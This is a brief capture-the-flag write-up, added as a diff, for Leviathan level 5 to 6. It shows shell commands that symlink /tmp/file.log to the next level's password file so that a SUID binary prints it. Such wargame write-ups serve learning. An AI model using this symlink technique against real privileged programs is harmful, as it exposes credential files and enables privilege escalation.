@@ -1,0 +1,11 @@
+5 -> 6
+We see that the binary in home directory "leviathan5" what does is trying to read an /tmp/file.log and we see that it has SUID perms as leviathan6 so we create an /tmp/file.log that is a soft link to /etc/leviathan_pass/leviathan6
+We run this instructions
+
+```
+leviathan5@leviathan:/tmp/tmp.sEK4EJOLsU$ ln -s /etc/leviathan_pass/leviathan6 file.log
+leviathan5@leviathan:/tmp/tmp.sEK4EJOLsU$ mv file.log /tmp/file.log
+leviathan5@leviathan:/tmp/tmp.sEK4EJOLsU$ ~/leviathan5
+```
+So the binary prints the password when executing
+
